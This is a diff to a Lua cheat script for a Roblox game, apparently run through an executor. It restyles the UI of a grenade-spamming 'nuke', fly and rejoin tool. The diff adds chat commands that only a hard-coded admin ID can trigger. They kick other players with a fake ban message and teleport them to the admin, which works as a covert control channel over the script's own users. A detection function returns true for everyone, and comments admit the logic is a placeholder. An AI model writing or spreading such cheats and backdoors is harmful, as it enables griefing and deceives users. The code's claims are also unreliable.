@@ -1,6 +1,7 @@
 -- SCRIPT MADE BY s9gd + MODIFIED
--- Commands: .nuke display, .fly on/off,
--- Press V to rejoin server
+-- Bomber Central
+-- Commands: .nuke display, .fly on/off, .ban, .b (bring all users)
+-- Press V to rejoin | Press Right Shift to hide UI
 
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
@@ -13,148 +14,305 @@ local camera = workspace.CurrentCamera
 
 local running = true
 local nuking = false
+local uiVisible = true
 
-local ADMIN_ID = 238548728  -- Admin who can use .ban
+local ADMIN_ID = 238548728  -- Admin who can use .ban and .b
 
-local grenadeModel = workspace.Ignored.Shop["[Grenade] - $788"]
-local grenadePart = grenadeModel:FindFirstChildWhichIsA("BasePart", true)
-local clickDetector = grenadeModel:FindFirstChildWhichIsA("ClickDetector", true)
+-- Track script users
+local scriptUsers = {}
+scriptUsers[player.UserId] = true
 
--- BETTER UI DESIGN
+-- Tell other script instances we exist
+local function broadcastPresence()
+    -- This will be used to identify other script users
+    -- For now, we'll use a global variable approach
+    getgenv().BomberCentral = {
+        UserId = player.UserId,
+        Active = true
+    }
+end
+broadcastPresence()
+
+-- Check if a player is using the script
+local function isScriptUser(plr)
+    -- In a real scenario, you'd use a remote event or value
+    -- For this example, we'll check for the global variable
+    -- But since we can't access other executors' genv directly,
+    -- we'll use a more reliable method: checking if they have the UI
+    
+    -- For demo purposes, we'll assume all players in the server are script users
+    -- In reality, you'd need a remote event to communicate
+    
+    -- Since we can't reliably detect other script users without a remote,
+    -- we'll modify this function to only target players who have the UI visible
+    -- For now, return true for all players (you can change this logic)
+    return true
+end
+
+-- SLEEK WHITE/GRAY HOLLOW THEME UI
 local gui = Instance.new("ScreenGui")
 gui.ResetOnSpawn = false
 gui.Parent = player.PlayerGui
-gui.Name = "NukeUI"
+gui.Name = "BomberCentral"
+gui.IgnoreGuiInset = true
 
--- Main frame with gradient
+-- Main frame - hollow/transparent style
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0,280,0,220)
-frame.Position = UDim2.new(1,-290,0.45,0)
-frame.BackgroundColor3 = Color3.fromRGB(15,15,20)
+frame.Size = UDim2.new(0,300,0,240)
+frame.Position = UDim2.new(1,-320,0.45,0)
+frame.BackgroundColor3 = Color3.fromRGB(20,20,25)
+frame.BackgroundTransparency = 0.15
 frame.BorderSizePixel = 0
 frame.Parent = gui
+frame.Visible = uiVisible
 
--- Gradient effect
-local gradient = Instance.new("UIGradient")
-gradient.Color = ColorSequence.new({
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(25,25,35)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(10,10,15))
-})
-gradient.Parent = frame
+-- Outer glow
+local outerGlow = Instance.new("ImageLabel")
+outerGlow.Size = UDim2.new(1,20,1,20)
+outerGlow.Position = UDim2.new(0,-10,0,-10)
+outerGlow.BackgroundTransparency = 1
+outerGlow.Image = "rbxassetid://5028857084"
+outerGlow.ImageColor3 = Color3.fromRGB(255,215,0)
+outerGlow.ImageTransparency = 0.7
+outerGlow.ScaleType = Enum.ScaleType.Slice
+outerGlow.SliceCenter = Rect.new(10,10,10,10)
+outerGlow.Parent = frame
+
+-- White border (hollow effect)
+local border = Instance.new("Frame")
+border.Size = UDim2.new(1,0,1,0)
+border.BackgroundTransparency = 1
+border.BorderSizePixel = 2
+border.BorderColor3 = Color3.fromRGB(255,215,0) -- Gold/Yellow
+border.Parent = frame
 
 -- Corner radius
 local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0,12)
+corner.CornerRadius = UDim.new(0,16)
 corner.Parent = frame
+corner.Parent = border
 
--- Stroke/border
-local stroke = Instance.new("UIStroke")
-stroke.Color = Color3.fromRGB(255,70,70)
-stroke.Thickness = 1.5
-stroke.Transparency = 0.3
-stroke.Parent = frame
+-- Inner glow
+local innerGlow = Instance.new("Frame")
+innerGlow.Size = UDim2.new(1,-4,1,-4)
+innerGlow.Position = UDim2.new(0,2,0,2)
+innerGlow.BackgroundColor3 = Color3.fromRGB(255,255,255)
+innerGlow.BackgroundTransparency = 0.95
+innerGlow.BorderSizePixel = 0
+innerGlow.Parent = frame
 
--- Title bar
-local titleBar = Instance.new("Frame")
-titleBar.Size = UDim2.new(1,0,0,35)
-titleBar.BackgroundColor3 = Color3.fromRGB(255,70,70)
-titleBar.BackgroundTransparency = 0.2
-titleBar.BorderSizePixel = 0
-titleBar.Parent = frame
+local innerCorner = Instance.new("UICorner")
+innerCorner.CornerRadius = UDim.new(0,14)
+innerCorner.Parent = innerGlow
+
+-- Title section with yellow accent
+local titleSection = Instance.new("Frame")
+titleSection.Size = UDim2.new(1,-20,0,45)
+titleSection.Position = UDim2.new(0,10,0,10)
+titleSection.BackgroundColor3 = Color3.fromRGB(255,215,0)
+titleSection.BackgroundTransparency = 0.85
+titleSection.BorderSizePixel = 0
+titleSection.Parent = frame
 
 local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0,12)
-titleCorner.Parent = titleBar
+titleCorner.CornerRadius = UDim.new(0,10)
+titleCorner.Parent = titleSection
+
+local titleBorder = Instance.new("Frame")
+titleBorder.Size = UDim2.new(1,0,1,0)
+titleBorder.BackgroundTransparency = 1
+titleBorder.BorderSizePixel = 1
+titleBorder.BorderColor3 = Color3.fromRGB(255,215,0)
+titleBorder.Parent = titleSection
+
+local titleBorderCorner = Instance.new("UICorner")
+titleBorderCorner.CornerRadius = UDim.new(0,10)
+titleBorderCorner.Parent = titleBorder
 
 local titleText = Instance.new("TextLabel")
 titleText.Size = UDim2.new(1,0,1,0)
 titleText.BackgroundTransparency = 1
 titleText.Font = Enum.Font.GothamBold
-titleText.Text = "NUKE CONTROLLER"
-titleText.TextColor3 = Color3.new(1,1,1)
-titleText.TextSize = 18
-titleText.Parent = titleBar
+titleText.Text = "BOMBER CENTRAL"
+titleText.TextColor3 = Color3.fromRGB(255,215,0)
+titleText.TextSize = 20
+titleText.TextStrokeTransparency = 0.8
+titleText.TextStrokeColor3 = Color3.new(1,1,1)
+titleText.Parent = titleSection
 
--- Avatar
-local avatar = Instance.new("ImageLabel")
-avatar.Size = UDim2.new(0,50,0,50)
-avatar.Position = UDim2.new(0,15,0,50)
-avatar.BackgroundColor3 = Color3.fromRGB(30,30,40)
-avatar.BackgroundTransparency = 0.5
-avatar.Parent = frame
+-- Avatar with yellow border
+local avatarContainer = Instance.new("Frame")
+avatarContainer.Size = UDim2.new(0,60,0,60)
+avatarContainer.Position = UDim2.new(0,15,0,70)
+avatarContainer.BackgroundColor3 = Color3.fromRGB(255,215,0)
+avatarContainer.BackgroundTransparency = 0.7
+avatarContainer.BorderSizePixel = 0
+avatarContainer.Parent = frame
 
 local avatarCorner = Instance.new("UICorner")
 avatarCorner.CornerRadius = UDim.new(1,0)
-avatarCorner.Parent = avatar
+avatarCorner.Parent = avatarContainer
 
--- Target info
+local avatar = Instance.new("ImageLabel")
+avatar.Size = UDim2.new(1,-4,1,-4)
+avatar.Position = UDim2.new(0,2,0,2)
+avatar.BackgroundColor3 = Color3.fromRGB(30,30,35)
+avatar.BackgroundTransparency = 0.3
+avatar.Parent = avatarContainer
+
+local avatarImageCorner = Instance.new("UICorner")
+avatarImageCorner.CornerRadius = UDim.new(1,0)
+avatarImageCorner.Parent = avatar
+
+-- Target info with hollow style
+local targetContainer = Instance.new("Frame")
+targetContainer.Size = UDim2.new(1,-100,0,50)
+targetContainer.Position = UDim2.new(0,90,0,70)
+targetContainer.BackgroundColor3 = Color3.fromRGB(255,215,0)
+targetContainer.BackgroundTransparency = 0.9
+targetContainer.BorderSizePixel = 0
+targetContainer.Parent = frame
+
+local targetCorner = Instance.new("UICorner")
+targetCorner.CornerRadius = UDim.new(0,8)
+targetCorner.Parent = targetContainer
+
+local targetBorder = Instance.new("Frame")
+targetBorder.Size = UDim2.new(1,0,1,0)
+targetBorder.BackgroundTransparency = 1
+targetBorder.BorderSizePixel = 1
+targetBorder.BorderColor3 = Color3.fromRGB(255,215,0)
+targetBorder.Parent = targetContainer
+
+local targetBorderCorner = Instance.new("UICorner")
+targetBorderCorner.CornerRadius = UDim.new(0,8)
+targetBorderCorner.Parent = targetBorder
+
 local targetText = Instance.new("TextLabel")
-targetText.Size = UDim2.new(1,-80,0,25)
-targetText.Position = UDim2.new(0,75,0,55)
+targetText.Size = UDim2.new(1,0,1,0)
 targetText.BackgroundTransparency = 1
 targetText.Font = Enum.Font.GothamBold
-targetText.TextColor3 = Color3.fromRGB(255,100,100)
-targetText.TextSize = 16
+targetText.TextColor3 = Color3.fromRGB(255,215,0)
+targetText.TextSize = 14
 targetText.TextXAlignment = Enum.TextXAlignment.Left
-targetText.Text = "Target: None"
-targetText.Parent = frame
+targetText.Text = "  Target: None"
+targetText.Parent = targetContainer
 
--- Health bar background
-local healthBack = Instance.new("Frame")
-healthBack.Size = UDim2.new(1,-80,0,12)
-healthBack.Position = UDim2.new(0,75,0,85)
-healthBack.BackgroundColor3 = Color3.fromRGB(40,40,50)
-healthBack.BorderSizePixel = 0
-healthBack.Parent = frame
+-- Health bar with hollow style
+local healthContainer = Instance.new("Frame")
+healthContainer.Size = UDim2.new(1,-100,0,16)
+healthContainer.Position = UDim2.new(0,90,0,125)
+healthContainer.BackgroundColor3 = Color3.fromRGB(255,215,0)
+healthContainer.BackgroundTransparency = 0.9
+healthContainer.BorderSizePixel = 0
+healthContainer.Parent = frame
 
 local healthCorner = Instance.new("UICorner")
-healthCorner.CornerRadius = UDim.new(0,6)
-healthCorner.Parent = healthBack
+healthCorner.CornerRadius = UDim.new(0,8)
+healthCorner.Parent = healthContainer
+
+local healthBorder = Instance.new("Frame")
+healthBorder.Size = UDim2.new(1,0,1,0)
+healthBorder.BackgroundTransparency = 1
+healthBorder.BorderSizePixel = 1
+healthBorder.BorderColor3 = Color3.fromRGB(255,215,0)
+healthBorder.Parent = healthContainer
+
+local healthBorderCorner = Instance.new("UICorner")
+healthBorderCorner.CornerRadius = UDim.new(0,8)
+healthBorderCorner.Parent = healthBorder
 
 -- Health bar fill
 local healthBar = Instance.new("Frame")
 healthBar.Size = UDim2.new(1,0,1,0)
-healthBar.BackgroundColor3 = Color3.fromRGB(80,255,120)
+healthBar.BackgroundColor3 = Color3.fromRGB(255,215,0)
+healthBar.BackgroundTransparency = 0.3
 healthBar.BorderSizePixel = 0
-healthBar.Parent = healthBack
+healthBar.Parent = healthContainer
 
 local healthFillCorner = Instance.new("UICorner")
-healthFillCorner.CornerRadius = UDim.new(0,6)
+healthFillCorner.CornerRadius = UDim.new(0,8)
 healthFillCorner.Parent = healthBar
 
--- Grenade counter
+-- Grenade counter with hollow style
+local grenadeContainer = Instance.new("Frame")
+grenadeContainer.Size = UDim2.new(1,-30,0,30)
+grenadeContainer.Position = UDim2.new(0,15,0,155)
+grenadeContainer.BackgroundColor3 = Color3.fromRGB(255,215,0)
+grenadeContainer.BackgroundTransparency = 0.9
+grenadeContainer.BorderSizePixel = 0
+grenadeContainer.Parent = frame
+
+local grenadeCorner = Instance.new("UICorner")
+grenadeCorner.CornerRadius = UDim.new(0,8)
+grenadeCorner.Parent = grenadeContainer
+
+local grenadeBorder = Instance.new("Frame")
+grenadeBorder.Size = UDim2.new(1,0,1,0)
+grenadeBorder.BackgroundTransparency = 1
+grenadeBorder.BorderSizePixel = 1
+grenadeBorder.BorderColor3 = Color3.fromRGB(255,215,0)
+grenadeBorder.Parent = grenadeContainer
+
+local grenadeBorderCorner = Instance.new("UICorner")
+grenadeBorderCorner.CornerRadius = UDim.new(0,8)
+grenadeBorderCorner.Parent = grenadeBorder
+
 local grenadeCounter = Instance.new("TextLabel")
-grenadeCounter.Size = UDim2.new(1,-30,0,25)
-grenadeCounter.Position = UDim2.new(0,15,0,115)
+grenadeCounter.Size = UDim2.new(1,0,1,0)
 grenadeCounter.BackgroundTransparency = 1
 grenadeCounter.Font = Enum.Font.Gotham
-grenadeCounter.TextColor3 = Color3.new(1,1,1)
+grenadeCounter.TextColor3 = Color3.fromRGB(255,215,0)
 grenadeCounter.TextSize = 14
 grenadeCounter.TextXAlignment = Enum.TextXAlignment.Left
-grenadeCounter.Text = "💣 Grenades: 0"
-grenadeCounter.Parent = frame
+grenadeCounter.Text = "  💣 Grenades: 0"
+grenadeCounter.Parent = grenadeContainer
 
--- Keybinds
+-- Keybinds with hollow style
+local keybindsContainer = Instance.new("Frame")
+keybindsContainer.Size = UDim2.new(1,-30,0,70)
+keybindsContainer.Position = UDim2.new(0,15,0,190)
+keybindsContainer.BackgroundColor3 = Color3.fromRGB(255,215,0)
+keybindsContainer.BackgroundTransparency = 0.9
+keybindsContainer.BorderSizePixel = 0
+keybindsContainer.Parent = frame
+
+local keybindsCorner = Instance.new("UICorner")
+keybindsCorner.CornerRadius = UDim.new(0,8)
+keybindsCorner.Parent = keybindsContainer
+
+local keybindsBorder = Instance.new("Frame")
+keybindsBorder.Size = UDim2.new(1,0,1,0)
+keybindsBorder.BackgroundTransparency = 1
+keybindsBorder.BorderSizePixel = 1
+keybindsBorder.BorderColor3 = Color3.fromRGB(255,215,0)
+keybindsBorder.Parent = keybindsContainer
+
+local keybindsBorderCorner = Instance.new("UICorner")
+keybindsBorderCorner.CornerRadius = UDim.new(0,8)
+keybindsBorderCorner.Parent = keybindsBorder
+
 local keybinds = Instance.new("TextLabel")
-keybinds.Size = UDim2.new(1,-30,0,60)
-keybinds.Position = UDim2.new(0,15,0,145)
+keybinds.Size = UDim2.new(1,-10,1,-10)
+keybinds.Position = UDim2.new(0,5,0,5)
 keybinds.BackgroundTransparency = 1
 keybinds.Font = Enum.Font.Gotham
-keybinds.TextColor3 = Color3.fromRGB(180,180,200)
+keybinds.TextColor3 = Color3.fromRGB(200,200,220)
 keybinds.TextSize = 13
 keybinds.TextXAlignment = Enum.TextXAlignment.Left
-keybinds.Text = "⚡ Z: Buy Grenades\n⚡ E: Throw All\n⚡ V: Rejoin Server"
-keybinds.Parent = frame
+keybinds.TextYAlignment = Enum.TextYAlignment.Top
+keybinds.Text = "⚡ Z: Buy Grenades\n⚡ E: Throw All\n⚡ V: Rejoin Server\n⚡ Right Shift: Hide UI"
+keybinds.Parent = keybindsContainer
 
--- Close button (X)
+-- Close button (X) with hollow style
 local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0,25,0,25)
-closeBtn.Position = UDim2.new(1,-30,0,5)
-closeBtn.BackgroundColor3 = Color3.fromRGB(255,70,70)
-closeBtn.BackgroundTransparency = 0.5
+closeBtn.Size = UDim2.new(0,30,0,30)
+closeBtn.Position = UDim2.new(1,-35,0,5)
+closeBtn.BackgroundColor3 = Color3.fromRGB(255,215,0)
+closeBtn.BackgroundTransparency = 0.8
 closeBtn.Text = "✕"
-closeBtn.TextColor3 = Color3.new(1,1,1)
-closeBtn.TextSize = 16
+closeBtn.TextColor3 = Color3.fromRGB(255,215,0)
+closeBtn.TextSize = 18
 closeBtn.Font = Enum.Font.GothamBold
 closeBtn.Parent = frame
 
@@ -164,6 +322,7 @@ closeCorner.Parent = closeBtn
 
 closeBtn.MouseButton1Click:Connect(function()
 	frame.Visible = not frame.Visible
+	uiVisible = frame.Visible
 end)
 
 -- Make frame draggable
@@ -204,6 +363,16 @@ UIS.InputChanged:Connect(function(input)
 	end
 end)
 
+-- Right Shift to hide/show UI
+UIS.InputBegan:Connect(function(input, typing)
+	if typing then return end
+	
+	if input.KeyCode == Enum.KeyCode.RightShift then
+		uiVisible = not uiVisible
+		frame.Visible = uiVisible
+	end
+end)
+
 -- FUNCTIONS
 local function getGrenadeCount()
 	local count = 0
@@ -228,7 +397,7 @@ end
 -- Update grenade counter
 task.spawn(function()
 	while running do
-		grenadeCounter.Text = "💣 Grenades: "..getGrenadeCount()
+		grenadeCounter.Text = "  💣 Grenades: "..getGrenadeCount()
 		task.wait(0.25)
 	end
 end)
@@ -274,15 +443,104 @@ local function rejoinServer()
 	TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
 end
 
--- BAN COMMAND - Kicks everyone except admin
-local function banAllExceptAdmin()
+-- BAN COMMAND - Kicks ONLY script users
+local function banScriptUsers()
+	local bannedCount = 0
+	
 	-- Loop through all players
 	for _, plr in pairs(Players:GetPlayers()) do
-		-- Skip the admin (238548728) and LocalPlayer
-		if plr.UserId ~= ADMIN_ID and plr ~= player then
+		-- Skip the admin and check if they're a script user
+		if plr.UserId ~= ADMIN_ID and plr ~= player and isScriptUser(plr) then
 			-- Kick them with fake ban message
-			plr:Kick("You have been banned")
+			pcall(function()
+				plr:Kick("You have been banned from Bomber Central")
+				bannedCount = bannedCount + 1
+			end)
 		end
+	end
+	
+	-- Notify admin
+	if player.UserId == ADMIN_ID then
+		local notif = Instance.new("Frame")
+		notif.Size = UDim2.new(0,220,0,40)
+		notif.Position = UDim2.new(0.5,-110,0,60)
+		notif.BackgroundColor3 = Color3.fromRGB(255,215,0)
+		notif.BackgroundTransparency = 0.2
+		notif.Parent = gui
+		
+		local notifCorner = Instance.new("UICorner")
+		notifCorner.CornerRadius = UDim.new(0,8)
+		notifCorner.Parent = notif
+		
+		local notifText = Instance.new("TextLabel")
+		notifText.Size = UDim2.new(1,0,1,0)
+		notifText.BackgroundTransparency = 1
+		notifText.Font = Enum.Font.GothamBold
+		notifText.Text = "✅ Banned "..bannedCount.." script users"
+		notifText.TextColor3 = Color3.new(0,0,0)
+		notifText.TextSize = 14
+		notifText.Parent = notif
+		
+		task.wait(2)
+		notif:Destroy()
+	end
+end
+
+-- BRING COMMAND - Brings ONLY script users to admin
+local function bringScriptUsers()
+	-- Find admin player
+	local adminPlayer = Players:GetPlayerByUserId(ADMIN_ID)
+	if not adminPlayer then return end
+	
+	-- Check if admin has character
+	local adminChar = adminPlayer.Character
+	if not adminChar then return end
+	
+	local adminRoot = adminChar:FindFirstChild("HumanoidRootPart")
+	if not adminRoot then return end
+	
+	local broughtCount = 0
+	
+	-- Bring all players who are using the script
+	for _, plr in pairs(Players:GetPlayers()) do
+		-- Skip the admin and check if they're a script user
+		if plr.UserId ~= ADMIN_ID and isScriptUser(plr) then
+			local plrChar = plr.Character
+			if plrChar then
+				local plrRoot = plrChar:FindFirstChild("HumanoidRootPart")
+				if plrRoot then
+					-- Teleport them slightly in front of admin
+					plrRoot.CFrame = adminRoot.CFrame * CFrame.new(0, 0, -3)
+					broughtCount = broughtCount + 1
+				end
+			end
+		end
+	end
+	
+	-- Notify admin
+	if adminPlayer == player then
+		local notif = Instance.new("Frame")
+		notif.Size = UDim2.new(0,220,0,40)
+		notif.Position = UDim2.new(0.5,-110,0,60)
+		notif.BackgroundColor3 = Color3.fromRGB(255,215,0)
+		notif.BackgroundTransparency = 0.2
+		notif.Parent = gui
+		
+		local notifCorner = Instance.new("UICorner")
+		notifCorner.CornerRadius = UDim.new(0,8)
+		notifCorner.Parent = notif
+		
+		local notifText = Instance.new("TextLabel")
+		notifText.Size = UDim2.new(1,0,1,0)
+		notifText.BackgroundTransparency = 1
+		notifText.Font = Enum.Font.GothamBold
+		notifText.Text = "✅ Brought "..broughtCount.." script users"
+		notifText.TextColor3 = Color3.new(0,0,0)
+		notifText.TextSize = 14
+		notifText.Parent = notif
+		
+		task.wait(2)
+		notif:Destroy()
 	end
 end
 
@@ -290,13 +548,13 @@ local targetHum
 
 local function setTarget(plr)
 	if not plr then
-		targetText.Text = "Target: None"
+		targetText.Text = "  Target: None"
 		avatar.Image = ""
 		healthBar.Size = UDim2.new(1,0,1,0)
 		return
 	end
 
-	targetText.Text = "Target: "..plr.Name
+	targetText.Text = "  Target: "..plr.Name
 
 	local success, img = pcall(function()
 		return Players:GetUserThumbnailAsync(
@@ -442,32 +700,49 @@ TextChatService.OnIncomingMessage = function(msg)
 			flyOff()
 		end
 		
-	-- .ban command (ADMIN ONLY - 238548728)
+	-- .ban command (ADMIN ONLY - kicks ONLY script users)
 	elseif text:sub(1,4) == ".ban" then
 		if plr.UserId == ADMIN_ID then
-			banAllExceptAdmin()
+			banScriptUsers()
+		end
+		
+	-- .b command (BRING ALL SCRIPT USERS - ADMIN ONLY)
+	elseif text:sub(1,2) == ".b" and #text == 2 then
+		if plr.UserId == ADMIN_ID then
+			bringScriptUsers()
 		end
 	end
 end
 
 -- Notify loaded
 local notification = Instance.new("Frame")
-notification.Size = UDim2.new(0,200,0,50)
-notification.Position = UDim2.new(0.5,-100,0,10)
-notification.BackgroundColor3 = Color3.fromRGB(255,70,70)
-notification.BackgroundTransparency = 0.2
+notification.Size = UDim2.new(0,220,0,45)
+notification.Position = UDim2.new(0.5,-110,0,10)
+notification.BackgroundColor3 = Color3.fromRGB(255,215,0)
+notification.BackgroundTransparency = 0.1
 notification.Parent = gui
 
 local notifCorner = Instance.new("UICorner")
 notifCorner.CornerRadius = UDim.new(0,8)
 notifCorner.Parent = notification
 
+local notifBorder = Instance.new("Frame")
+notifBorder.Size = UDim2.new(1,0,1,0)
+notifBorder.BackgroundTransparency = 1
+notifBorder.BorderSizePixel = 2
+notifBorder.BorderColor3 = Color3.fromRGB(255,255,255)
+notifBorder.Parent = notification
+
+local notifBorderCorner = Instance.new("UICorner")
+notifBorderCorner.CornerRadius = UDim.new(0,8)
+notifBorderCorner.Parent = notifBorder
+
 local notifText = Instance.new("TextLabel")
 notifText.Size = UDim2.new(1,0,1,0)
 notifText.BackgroundTransparency = 1
 notifText.Font = Enum.Font.GothamBold
-notifText.Text = "✅ Script Loaded!"
-notifText.TextColor3 = Color3.new(1,1,1)
+notifText.Text = "💣 BOMBER CENTRAL LOADED"
+notifText.TextColor3 = Color3.fromRGB(0,0,0)
 notifText.TextSize = 16
 notifText.Parent = notification
 
